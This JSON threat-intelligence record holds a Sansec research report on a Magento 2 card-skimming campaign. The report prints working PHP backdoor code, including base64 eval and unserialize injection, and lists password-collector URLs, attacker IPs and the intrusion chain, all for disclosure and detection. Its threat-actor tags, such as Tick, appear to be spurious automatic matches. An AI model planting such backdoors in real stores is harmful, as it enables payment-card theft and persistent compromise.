@@ -1,0 +1,188 @@
+{
+    "id": "7996f90a-8829-4ef2-b914-d6e0a63451d5",
+    "created_at": "2023-01-12T15:03:59.859622Z",
+    "updated_at": "2025-03-27T02:16:59.228936Z",
+    "deleted_at": null,
+    "sha1_hash": "6781360b15a15416383b02064b874dd1e48f6eb9",
+    "title": "2020-12-02 - Persistent parasite in EOL Magento 2 stores wakes at Black Friday",
+    "authors": "",
+    "file_creation_date": "2022-05-28T22:08:43Z",
+    "file_modification_date": "2022-05-28T22:08:43Z",
+    "file_size": 1450052,
+    "plain_text": "# Hackers exploit security flaw right before Black Friday\n\n**sansec.io/research/magento-2-persistent-parasite**\n\nDecember 2, 2020\n\n2nd December 2020\n\n[Web Skimming / Sansec Threat Research](https://sansec.io/research)\nLearn about new eCommerce hacks?\n\nReceive an alert whenever we discover new hacks or vulnerabilities that may affect\nyour online store.\n\nWhat is\n\nMagecart?\n\nAlso known as digital skimming, this crime has surged since 2015. Criminals steal\ncard data during online shopping. Who are behind these notorious hacks, how does it\nwork, and how have Magecart attacks evolved over time?\n\n[About Magecart](https://sansec.io/what-is-magecart)\n\nPersistent parasite stays dormant in Magento 2 until Black Friday\n\nOver the last months, hackers have quietly added a subtle security flaw to over 50 large\nonline stores, only to exploit them right before Black Friday, Sansec research shows. The\nflaw’s presence would ensure future access for the attackers, even if their primary operation\nwas blown. Sansec has been tracking this developing campaign since April this year, and\nfound numerous stealthy tactics to dodge detection.\n\n**The affected stores were all running the older Magento 2.2, which is unsupported**\n**since December 2019.**\n\n\n-----\n\nIn addition to the injected flaw, attackers used a hybrid skimming architecture, with front and\nback end malware working in tandem. The added obfuscation & safeguarding measures\nmake this the most complex skimming operation Sansec has identified this year.\n\n_Thanks to_ _[@RicTempesta,](https://twitter.com/RicTempesta)_ _[@giacmir and](https://github.com/giacmir)_ _[@vdloo_ for additional analysis](https://twitter.com/vdloo_)_\n\n## A persistent parasite\n\nEver bitten by a tick? Just removing the body will not prevent a nasty infection. As is the\ncase with this campaign, where attackers injected multiple safeguarding mechanisms to\nsecure their operations. The attack is extremely difficult to get rid of, and most compromised\nmerchants will see a reinfection within days after a cleanup.\n\nThis sophisticated attack consists of 4 components:\n\n1. a subtle POI security flaw functioning as backdoor\n2. a backdoor watchdog in the form of a hidden system process\n[3. a CORS-defeating hybrid payment (Magecart) skimmer, using frontend and backend](https://sansec.io/what-is-magecart)\n\ncomponents, with an discrete PII-retrieval feature\n4. an admin password logger with remote exfiltration\n\nThe backdoor allows the attacker to inject future, more advanced code into the site. The\nwatchdog ensures recovery of the backdoor, should somebody remove it. And the admin\npassword logger, well, logs passwords just in case.\n\nWe will describe each component here. Sansec has found all attacks to be hand-crafted for\nindividual stores, so the malware on your store may vary slightly.\n\n**Are you affected?** **Our eComscan scanner detects all of the varieties that we have**\n**investigated so far.**\n\n## Part A: The Product Compare Backdoor\n\nSansec found two distinct backdoors added to the Product Compare functionality of\nMagento 2. Both are activated by sending a specially crafted `POST to`\n```\n/catalog/product_compare/ . The first one is trivial and easily detectable. If the product\n\n```\nkey matches, it will run the given products as executable code:\n```\n// generated/code/Magento/Catalog/Controller/Product/Compare/Index/Interceptor.php\n$productContents = $this->getRequest()->getParam('product_contents');\n$productKey = $this->getRequest()->getParam('product_key');\nif($productContents != \"\" && \n  $productKey ==\n\"ceedf557f7e6acb1f0025c07df235c555e2d9d808e7f6e6e64825a3d5bb2ee6d\") {\n    $productValues = base64_decode($productContents);\n    eval ($productValues);\n}\n\n```\n\n-----\n\nThe second one is much more subtle, because it injects the PHP `unserialize function.`\nThis feature is officially deprecated, because it allows PHP Object Injection (POI) attacks.\n[Previously, Sansec published dozens of POI attacks in eCommerce extensions. The use of](https://sansec.io/research/magecart-extension-0days)\nunserialize may look benign to the casual observer, while it actually hands full control to\nanyone knocking on its door (with a properly crafted PHP object).\n\nAlso, the irony of a PHP Object Injection injection is not lost on us.\n```\n// generated/code/Magento/Catalog/Controller/Product/Compare/Index/Interceptor.php\n$productContents = $this->getRequest()->getParam('product_contents');\nif($productContents != \"\") {\n  $pluginData = new \\Zend\\Serializer\\Adapter\\PhpCode;\n  $data = '\"plugInfo\";' . base64_decode($productContents);\n  $pluginData->unserialize($data);\n}\n\n```\n[NB when this backdoor is used, it will trigger a warning in your logs (more info):](https://docs.zendframework.com/zend-serializer/adapter/)\n```\nWarning: Uses eval() The PhpCode adapter utilizes eval() to unserialize. This\nintroduces both a performance and potential security issue as a new process will be\nexecuted.\nThe Zend\\Serializer\\Adapter\\PhpCode adapter generates a parsable PHP code\nrepresentation using var_export(). To restore, the data will be executed using eval.\n\n```\nA similar but slightly different backdoor was found to be injected into `app/autoload.php :`\n```\n$productKey = \"\";\nif (isset($_POST['product_key']))\n  $productKey = $_POST['product_key'];\nif (isset($_POST['VENDOR_NEW_PATH_MAGE']) && \n  ($productKey != \"PRODUCT_KEY\") ) {\n  $vendor_path = $_POST['VENDOR_NEW_PATH_MAGE'] ;\n  $pr_func = \"base\". \"64_de\".\"code\";\n  $path_data = $pr_func($vendor_path);\n    eval ($path_data);\n}\n\n## Part B: The Backdoor Watchdog\n\n```\nAttackers may have started one or more background processes on your server that will\nmonitor the presence of the malware. Should the backdoor in Product Compare be\nremoved, the original backdoor will get reinstalled. Meanwhile, the timestamps of all your\nfiles are reset, so that the odd timestamp will not cause any suspicion.\n\nThe backdoor watchdog is a compiled C process that is started from `/pub/media . The`\nprocess may have multiple names that mimick legitimate system processes, such as:\n```\ndnsadmin dormant\nsshd [net]\nphp-fpm: pool www\n\n```\n\n-----\n\nThe actual executable is deleted from `/pub/media but can be inspected via`\n```\n/proc/<pid>/exe . The watchdog contains a hard copy of the actual backdoor (which can\n\n```\nbe inspected with `strings /proc/<pid>/exe ). After reinjecting the backdoor, the`\nwatchdog will run `find generated/ -type f -name \"*.php\" -exec touch {} to reset`\nthe timestamps.\n\nAdditionally, the watchdog process listens on TCP port 9000. We haven’t investigated\nfurther, but it is likely another out-of-bounds channel to receive commands by the malware\nowner.\n\nPro tip: quickly find any of these backdoor watchdogs by running:\n```\nsudo grep -l Magento.Catalog /proc/*/exe\n\n## Part C: The Magecart Payment Stealer\n\n```\nThe skimmer is added to `require.js or another static JS file on disk. It may show a fake`\npayment form (customized for the specific shop) but in all cases, sends all of the\nintercepted data to `/checkout . This is almost identical to a normal transaction flow, so`\nsecurity monitoring systems will not raise any flags.\n\nThen on the server side, a payload handler is added to `vendor/magento/module-`\n```\ncustomer/Model/Session.php . It collects the payment data and saves it to a discrete\n\n```\nlocation for later retrieval (such as\n```\npub/media/tmp/design/file/default_luma_logo.jpg or\n\n```\n\n-----\n\nThe stored credit card data is not retrieved directly, but via a generic POST (in most cases\nto `/ ). Here, the attacker first retrieves the stolen data (5628 bytes) and then truncates the`\ntemporary data storage.\n```\n193.160.32.219 - \"POST / HTTP/1.0\" 200 5628 \"\" \"Mozilla/5.0 (Macintosh; Intel Mac\nOS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73\nSafari/537.36\"\n193.160.32.219 - \"POST / HTTP/1.1\" 200 5611 \"\" \"Mozilla/5.0 (Macintosh; Intel Mac\nOS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73\nSafari/537.36\"\n193.160.32.219 - \"POST / HTTP/1.0\" 200 20 \"\" \"Mozilla/5.0 (Macintosh; Intel Mac OS\nX 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36\"\n193.160.32.219 - \"POST / HTTP/1.1\" 200 25 \"\" \"Mozilla/5.0 (Macintosh; Intel Mac OS\nX 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36\"\n\n## Part D: The Admin Password Logger\n\n```\nWhile all these lines of defense look fairly impenetrable, the attackers added yet another\nsafeguard. Should all of their access get revoked, they would still receive live copies of staff\npassword, delivered to one of these collector URLs:\n```\nhttps://www.wheelsonheels.co.uk/pub/health_check.php\nhttps://www.ledpro.com/pub/health_check.php\nhttps://zago-store.vn/pub/health_check.php\n\n```\nRelevant code:\n\n\n-----\n\nBecause the password logger is initially added to `vendor/magento/module-`\n```\nbackend/Model/Auth.php, it will automatically end up in\ngenerated/code/Magento/Backend/Model/Auth/Proxy.php every time the Magento 2\n\n```\ncode is regenerated.\n\nAnother interesting bit is the presence of a `getCredentialStorageChiper function. It`\nwould have looked like a benign function, if only the author hadn’t made the mistake of\nwriting `Chiper instead of` `Cipher .`\n\n[Luke reported one of these password loggers on Twitter last week.](https://twitter.com/rootprivilege/status/1331766420317773826)\n\n## Root cause analysis\n\nAll investigated targets were running Magento 2.2.3 up to 2.2.7. While it is widely used, the\n2.2 branch is officially deprecated and all stores are urged to upgrade to Magento 2.3 or\n2.4.\n\nIn order to gain access to these stores in the first place, the attackers exploited multiple\n[security issues that were patched in Magento version 2.1.17, 2.2.8 and 2.3.1.](https://magento.com/security/patches/magento-2.3.1-2.2.8-and-2.1.17-security-update)\n\n1. Retrieve hidden admin panel URL via information disclosure issue.\n2. Intercept logged-in administrator session key via SQL injection.\n3. Log in on the admin panel and create temporary email template, which can be\n\nexploited to run uploaded PHP code.\n4. Add backdoor\n5. ….possibly a long idle period\n6. Add skimmer\n7. Periodically retrieve intercepted payment data via POST to `/`\n\nAn observed attack chain:\n\n\n-----\n\n## Attribution\n\nSansec observed the following IPs that either injected malware or retrieved intercepted\ndata:\n```\n104.129.16.8\n104.168.14.206\n107.172.97.122\n155.94.198.5\n167.88.61.117\n167.88.61.176\n167.88.61.176 \n185.152.67.39\n185.154.13.210\n193.160.32.219\n198.255.66.27\n2.58.45.2\n50.7.159.34\n66.154.104.2\n66.154.105.2\n66.212.20.8\n67.88.61.176\n87.166.53.100\n96.44.161.8\n\n## Recommendations\n\n```\nSansec recommends all affected merchants to engage a forensic investigate and cleanup.\n[We have provided a checklist for your convenience. Our flagship software eComscan will](https://sansec.io/kb/incident-response/an-issue-was-found-what-next)\nhelp your team right now with the investigation, and will also help to prevent future\nincidents.\n\n_[Header image by Erik Karits](https://unsplash.com/@erik_karits)_\n\n[data-size=\"large\" > Follow @sansecio](https://twitter.com/sansecio)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-02 - Persistent parasite in EOL Magento 2 stores wakes at Black Friday.pdf"
+    ],
+    "report_names": [
+        "2020-12-02 - Persistent parasite in EOL Magento 2 stores wakes at Black Friday.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
+            "created_at": "2023-01-06T13:46:38.626906Z",
+            "updated_at": "2025-03-27T02:00:02.877001Z",
+            "deleted_at": null,
+            "main_name": "Tick",
+            "aliases": [
+                "Stalker Taurus",
+                "PLA Unit 61419",
+                "Nian",
+                "BRONZE BUTLER",
+                "REDBALDKNIGHT",
+                "STALKER PANDA",
+                "G0060"
+            ],
+            "source_name": "MISPGALAXY:Tick",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
+            "created_at": "2023-01-06T13:46:38.814104Z",
+            "updated_at": "2025-03-27T02:00:02.925972Z",
+            "deleted_at": null,
+            "main_name": "MageCart",
+            "aliases": [],
+            "source_name": "MISPGALAXY:MageCart",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
+            "created_at": "2022-10-25T16:07:23.419513Z",
+            "updated_at": "2025-03-27T02:02:09.790389Z",
+            "deleted_at": null,
+            "main_name": "Bronze Butler",
+            "aliases": [
+                "Bronze Butler",
+                "CTG-2006",
+                "Operation ENDTRADE",
+                "RedBaldNight",
+                "Stalker Panda",
+                "Stalker Taurus",
+                "TEMP.Tick",
+                "Tick"
+            ],
+            "source_name": "ETDA:Bronze Butler",
+            "tools": [
+                "8.t Dropper",
+                "8.t RTF exploit builder",
+                "8t_dropper",
+                "9002 RAT",
+                "AngryRebel",
+                "Blogspot",
+                "Daserf",
+                "Datper",
+                "Elirks",
+                "Farfli",
+                "Gh0st RAT",
+                "Ghost RAT",
+                "HOMEUNIX",
+                "HidraQ",
+                "HomamDownloader",
+                "Homux",
+                "Hydraq",
+                "Lilith",
+                "Lilith RAT",
+                "McRAT",
+                "MdmBot",
+                "Mimikatz",
+                "Minzen",
+                "Moudour",
+                "Muirim",
+                "Mydoor",
+                "Nioupale",
+                "PCRat",
+                "POISONPLUG.SHADOW",
+                "Roarur",
+                "RoyalRoad",
+                "ShadowPad Winnti",
+                "ShadowWali",
+                "ShadowWalker",
+                "SymonLoader",
+                "WCE",
+                "Wali",
+                "Windows Credential Editor",
+                "Windows Credentials Editor",
+                "XShellGhost",
+                "XXMM",
+                "gsecdump",
+                "rarstar"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
+            "created_at": "2022-10-25T16:47:55.541639Z",
+            "updated_at": "2025-03-27T02:05:17.253496Z",
+            "deleted_at": null,
+            "main_name": "BRONZE BUTLER",
+            "aliases": [
+                "Daserf",
+                "Stalker Panda ",
+                "Tick ",
+                "CTG-2006 "
+            ],
+            "source_name": "Secureworks:BRONZE BUTLER",
+            "tools": [
+                " DGet",
+                " Daserf",
+                " Datper",
+                " Gofarer",
+                " MSGet",
+                " Mimikatz",
+                " RarStar",
+                " Screen Capture Tool",
+                " ShadowPad",
+                " T-SMB",
+                " WinRAR",
+                " Windows Credential Editor",
+                " gsecdump",
+                " xmm downloader",
+                " xxmm",
+                "ABK"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
+            "created_at": "2023-01-06T13:46:39.431871Z",
+            "updated_at": "2025-03-27T02:00:03.08926Z",
+            "deleted_at": null,
+            "main_name": "Watchdog",
+            "aliases": [
+                "Thief Libra"
+            ],
+            "source_name": "MISPGALAXY:Watchdog",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535839,
+    "ts_updated_at": 1743041819,
+    "ts_creation_date": 1653775723,
+    "ts_modification_date": 1653775723,
+    "files": {
+        "pdf": "https://archive.orkl.eu/6781360b15a15416383b02064b874dd1e48f6eb9.pdf",
+        "text": "https://archive.orkl.eu/6781360b15a15416383b02064b874dd1e48f6eb9.txt",
+        "img": "https://archive.orkl.eu/6781360b15a15416383b02064b874dd1e48f6eb9.jpg"
+    }
+}
